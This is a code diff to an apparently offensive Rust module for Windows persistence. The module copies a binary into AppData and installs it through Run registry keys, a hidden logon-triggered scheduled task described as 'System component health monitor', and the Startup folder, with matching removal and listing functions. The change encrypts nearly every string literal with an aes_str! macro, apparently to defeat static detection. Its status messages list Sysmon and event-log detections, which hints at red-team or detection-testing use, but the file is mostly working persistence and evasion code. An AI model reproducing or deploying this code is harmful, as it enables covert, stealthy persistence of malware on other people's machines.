@@ -113,7 +113,7 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
         .map(|e| format!(".{}", e.to_string_lossy()))
         .unwrap_or_else(|| aes_str!(".exe"));
 
-    let dst = format!("{}\\Microsoft\\{}{}", appdata, name, ext);
+    let dst = format!("{}{}{}{}", appdata, aes_str!("\\Microsoft\\"), name, ext);
 
     // Skip copy if already at destination (canonicalize handles symlinks)
     let already = std::fs::canonicalize(source)
@@ -124,7 +124,7 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
 
     if !already {
         std::fs::copy(source, &dst)
-            .map_err(|e| format!("stable_drop: {} → {}: {}", source, dst, e))?;
+            .map_err(|e| format!("{}: {} → {}: {}", aes_str!("stable_drop"), source, dst, e))?;
     }
 
     Ok(dst)
@@ -168,7 +168,7 @@ pub fn install_run(value_name: &str, binary_path: &str, use_hklm: bool) -> Resul
         )
     };
     if rc != ERROR_SUCCESS {
-        return Err(format!("RegCreateKeyExW failed ({})", rc));
+        return Err(format!("{} ({})", aes_str!("RegCreateKeyExW failed"), rc));
     }
 
     let rc2 = unsafe {
@@ -184,14 +184,19 @@ pub fn install_run(value_name: &str, binary_path: &str, use_hklm: bool) -> Resul
     unsafe { RegCloseKey(hkey); }
 
     if rc2 != ERROR_SUCCESS {
-        return Err(format!("RegSetValueExW failed ({})", rc2));
+        return Err(format!("{} ({})", aes_str!("RegSetValueExW failed"), rc2));
     }
 
     let hive = if use_hklm { aes_str!("HKLM") } else { aes_str!("HKCU") };
     Ok(format!(
-        "[+] Run key installed\n    Copied: {} → {stable}\n    Hive:  {hive}\n    Key:   {}\n    Value: {value_name}\n    Data:  {stable}\n    \
-         Detection: Sysmon 12/13 (registry), ETW Kernel-Registry",
-        binary_path, run_subkey()
+        "{}\n    {} {} → {}\n    {}  {}\n    {}   {}\n    {} {}\n    {}  {}\n    {}",
+        aes_str!("[+] Run key installed"),
+        aes_str!("Copied:"), binary_path, stable,
+        aes_str!("Hive:"), hive,
+        aes_str!("Key:"), run_subkey(),
+        aes_str!("Value:"), value_name,
+        aes_str!("Data:"), stable,
+        aes_str!("Detection: Sysmon 12/13 (registry), ETW Kernel-Registry")
     ))
 }
 
@@ -205,16 +210,16 @@ pub fn remove_run(value_name: &str, use_hklm: bool) -> Result<String, String> {
         RegOpenKeyExW(root, subkey_w.as_ptr(), 0, KEY_SET_VALUE, &mut hkey)
     };
     if rc != ERROR_SUCCESS {
-        return Err(format!("RegOpenKeyExW failed ({})", rc));
+        return Err(format!("{} ({})", aes_str!("RegOpenKeyExW failed"), rc));
     }
 
     let rc2 = unsafe { RegDeleteValueW(hkey, name_w.as_ptr()) };
     unsafe { RegCloseKey(hkey); }
 
     match rc2 {
-        r if r == ERROR_SUCCESS        => Ok(format!("[+] Run value '{value_name}' removed")),
-        r if r == ERROR_FILE_NOT_FOUND => Err(format!("Value '{value_name}' not found")),
-        r                              => Err(format!("RegDeleteValueW failed ({})", r)),
+        r if r == ERROR_SUCCESS        => Ok(format!("{} '{}' {}", aes_str!("[+] Run value"), value_name, aes_str!("removed"))),
+        r if r == ERROR_FILE_NOT_FOUND => Err(format!("{} '{}' {}", aes_str!("Value"), value_name, aes_str!("not found"))),
+        r                              => Err(format!("{} ({})", aes_str!("RegDeleteValueW failed"), r)),
     }
 }
 
@@ -245,7 +250,8 @@ fn build_task_xml(binary_path: &str) -> String {
     // <Hidden> suppresses the task from the Task Scheduler UI - commonly
     // used by both attackers and legitimate maintenance software.
     format!(
-        r#"<?xml version="1.0" encoding="UTF-16"?>
+        "{}{}{}",
+        aes_str!(r#"<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Description>System component health monitor</Description>
@@ -270,10 +276,12 @@ fn build_task_xml(binary_path: &str) -> String {
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>{binary_path}</Command>
+      <Command>"#),
+        binary_path,
+        aes_str!(r#"</Command>
     </Exec>
   </Actions>
-</Task>"#
+</Task>"#)
     )
 }
 
@@ -287,7 +295,7 @@ pub fn install_task(task_name: &str, binary_path: &str) -> Result<String, String
             let we_initialized = co_init_rc.is_ok();
             let result = install_task_com(task_name, &stable);
             if we_initialized { CoUninitialize(); }
-            return result.map(|msg| format!("    Copied: {} → {stable}\n{msg}", binary_path));
+            return result.map(|msg| format!("    {} {} → {}\n{}", aes_str!("Copied:"), binary_path, stable, msg));
         }
     }
 
@@ -300,14 +308,14 @@ pub fn install_task(task_name: &str, binary_path: &str) -> Result<String, String
 unsafe fn install_task_com(task_name: &str, binary_path: &str) -> Result<String, String> {
     let svc: ITaskService =
         CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER)
-            .map_err(|e| format!("CoCreateInstance ITaskService: {e}"))?;
+            .map_err(|e| format!("{}: {}", aes_str!("CoCreateInstance ITaskService"), e))?;
 
     svc.Connect(None, None, None, None)
-        .map_err(|e| format!("ITaskService::Connect: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("ITaskService::Connect"), e))?;
 
     let folder: ITaskFolder = svc
         .GetFolder(&BSTR::from("\\"))
-        .map_err(|e| format!("GetFolder: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("GetFolder"), e))?;
 
     let xml = build_task_xml(binary_path);
 
@@ -321,11 +329,15 @@ unsafe fn install_task_com(task_name: &str, binary_path: &str) -> Result<String,
             TASK_LOGON_INTERACTIVE_TOKEN,
             None,
         )
-        .map_err(|e| format!("RegisterTask: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("RegisterTask"), e))?;
 
     Ok(format!(
-        "[+] Scheduled task installed (COM)\n    Name:    {task_name}\n    Binary:  {binary_path}\n    Trigger: At logon (least privilege, hidden)\n    \
-         Detection: Event 4698 (Security), ETW TaskScheduler/Operational 106"
+        "{}\n    {}    {}\n    {}  {}\n    {} {}\n    {}",
+        aes_str!("[+] Scheduled task installed (COM)"),
+        aes_str!("Name:"), task_name,
+        aes_str!("Binary:"), binary_path,
+        aes_str!("Trigger:"), aes_str!("At logon (least privilege, hidden)"),
+        aes_str!("Detection: Event 4698 (Security), ETW TaskScheduler/Operational 106")
     ))
 }
 
@@ -345,16 +357,19 @@ fn install_task_schtasks(task_name: &str, stable_path: &str, original_path: &str
             aes_str!("/tr"),  stable_path.to_string(),
         ])
         .status()
-        .map_err(|e| format!("schtasks.exe: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("schtasks.exe"), e))?;
 
     if rc.success() {
         Ok(format!(
-            "[+] Scheduled task installed (schtasks)\n    Copied:  {} → {stable_path}\n    Name:    {task_name}\n    Trigger: At logon (least privilege)\n    \
-             Detection: Event 4698, ETW TaskScheduler/Operational 106, schtasks.exe process create",
-            original_path
+            "{}\n    {}  {} → {}\n    {}    {}\n    {} {}\n    {}",
+            aes_str!("[+] Scheduled task installed (schtasks)"),
+            aes_str!("Copied:"), original_path, stable_path,
+            aes_str!("Name:"), task_name,
+            aes_str!("Trigger:"), aes_str!("At logon (least privilege)"),
+            aes_str!("Detection: Event 4698, ETW TaskScheduler/Operational 106, schtasks.exe process create")
         ))
     } else {
-        Err(format!("schtasks.exe exited {}", rc.code().unwrap_or(-1)))
+        Err(format!("{} {}", aes_str!("schtasks.exe exited"), rc.code().unwrap_or(-1)))
     }
 }
 
@@ -378,16 +393,16 @@ pub fn remove_task(task_name: &str) -> Result<String, String> {
 unsafe fn remove_task_com(task_name: &str) -> Result<String, String> {
     let svc: ITaskService =
         CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER)
-            .map_err(|e| format!("CoCreateInstance: {e}"))?;
+            .map_err(|e| format!("{}: {}", aes_str!("CoCreateInstance"), e))?;
     svc.Connect(None, None, None, None)
-        .map_err(|e| format!("Connect: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Connect"), e))?;
     let folder: ITaskFolder = svc
         .GetFolder(&BSTR::from("\\"))
-        .map_err(|e| format!("GetFolder: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("GetFolder"), e))?;
     folder
         .DeleteTask(&BSTR::from(task_name), 0)
-        .map_err(|e| format!("DeleteTask: {e}"))?;
-    Ok(format!("[+] Scheduled task '{task_name}' removed"))
+        .map_err(|e| format!("{}: {}", aes_str!("DeleteTask"), e))?;
+    Ok(format!("{} '{}' {}", aes_str!("[+] Scheduled task"), task_name, aes_str!("removed")))
 }
 
 #[cfg(not(target_env = "msvc"))]
@@ -396,11 +411,11 @@ fn remove_task_schtasks(task_name: &str) -> Result<String, String> {
     let rc = Command::new(aes_str!("schtasks"))
         .args([aes_str!("/delete"), aes_str!("/f"), aes_str!("/tn"), task_name.to_string()])
         .status()
-        .map_err(|e| format!("schtasks.exe: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("schtasks.exe"), e))?;
     if rc.success() {
-        Ok(format!("[+] Scheduled task '{task_name}' removed"))
+        Ok(format!("{} '{}' {}", aes_str!("[+] Scheduled task"), task_name, aes_str!("removed")))
     } else {
-        Err(format!("schtasks /delete exited {}", rc.code().unwrap_or(-1)))
+        Err(format!("{} {}", aes_str!("schtasks /delete exited"), rc.code().unwrap_or(-1)))
     }
 }
 
@@ -415,11 +430,11 @@ fn startup_folder() -> Result<PathBuf, String> {
     let appdata = std::env::var(aes_str!("APPDATA"))
         .map_err(|_| aes_str!("APPDATA environment variable not set"))?;
     Ok(PathBuf::from(appdata)
-        .join("Microsoft")
-        .join("Windows")
-        .join("Start Menu")
-        .join("Programs")
-        .join("Startup"))
+        .join(aes_str!("Microsoft"))
+        .join(aes_str!("Windows"))
+        .join(aes_str!("Start Menu"))
+        .join(aes_str!("Programs"))
+        .join(aes_str!("Startup")))
 }
 
 pub fn install_startup(file_name: &str, source_path: &str) -> Result<String, String> {
@@ -427,12 +442,14 @@ pub fn install_startup(file_name: &str, source_path: &str) -> Result<String, Str
     dst.push(file_name);
 
     std::fs::copy(source_path, &dst)
-        .map_err(|e| format!("Copy to startup folder failed: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Copy to startup folder failed"), e))?;
 
     Ok(format!(
-        "[+] Startup folder persistence installed\n    Source: {source_path}\n    Dest:   {}\n    \
-         Detection: Sysmon 11 (file create in startup path), ETW Kernel-File",
-        dst.display()
+        "{}\n    {} {}\n    {}   {}\n    {}",
+        aes_str!("[+] Startup folder persistence installed"),
+        aes_str!("Source:"), source_path,
+        aes_str!("Dest:"), dst.display(),
+        aes_str!("Detection: Sysmon 11 (file create in startup path), ETW Kernel-File")
     ))
 }
 
@@ -441,9 +458,9 @@ pub fn remove_startup(file_name: &str) -> Result<String, String> {
     dst.push(file_name);
 
     std::fs::remove_file(&dst)
-        .map_err(|e| format!("Remove startup file failed: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Remove startup file failed"), e))?;
 
-    Ok(format!("[+] Removed '{}' from startup folder", dst.display()))
+    Ok(format!("{} '{}' {}", aes_str!("[+] Removed"), dst.display(), aes_str!("from startup folder")))
 }
 
 // ── Inventory ─────────────────────────────────────────────────────────
@@ -452,15 +469,15 @@ pub fn list() -> String {
     let mut out = Vec::new();
 
     // HKCU Run
-    out.push("=== HKCU Run ===".to_string());
+    out.push(aes_str!("=== HKCU Run ==="));
     out.extend(list_run_keys(false));
 
     // HKLM Run
-    out.push("\n=== HKLM Run ===".to_string());
+    out.push(aes_str!("\n=== HKLM Run ==="));
     out.extend(list_run_keys(true));
 
     // Startup folder
-    out.push("\n=== Startup Folder ===".to_string());
+    out.push(aes_str!("\n=== Startup Folder ==="));
     if let Ok(folder) = startup_folder() {
         match std::fs::read_dir(&folder) {
             Ok(entries) => {
@@ -469,12 +486,12 @@ pub fn list() -> String {
                     .map(|e| format!("  {}", e.file_name().to_string_lossy()))
                     .collect();
                 if files.is_empty() {
-                    out.push("  (empty)".into());
+                    out.push(aes_str!("  (empty)"));
                 } else {
                     out.extend(files);
                 }
             }
-            Err(e) => out.push(format!("  Error reading startup folder: {e}")),
+            Err(e) => out.push(format!("  {}: {}", aes_str!("Error reading startup folder"), e)),
         }
     }
 
@@ -488,7 +505,7 @@ fn list_run_keys(use_hklm: bool) -> Vec<String> {
 
     let rc = unsafe { RegOpenKeyExW(root, subkey_w.as_ptr(), 0, KEY_READ, &mut hkey) };
     if rc != ERROR_SUCCESS {
-        return vec![format!("  (could not open key: {})", rc)];
+        return vec![format!("  ({} {})", aes_str!("could not open key:"), rc)];
     }
 
     let mut results = Vec::new();
@@ -527,7 +544,7 @@ fn list_run_keys(use_hklm: bool) -> Vec<String> {
             };
             from_wide_nul(words)
         } else {
-            format!("(binary, {} bytes)", data_len)
+            format!("{}{} {}", aes_str!("(binary,"), data_len, aes_str!("bytes)"))
         };
         results.push(format!("  {name} = {data}"));
         index += 1;
@@ -536,7 +553,7 @@ fn list_run_keys(use_hklm: bool) -> Vec<String> {
     unsafe { RegCloseKey(hkey); }
 
     if results.is_empty() {
-        results.push("  (none)".into());
+        results.push(aes_str!("  (none)"));
     }
     results
 }
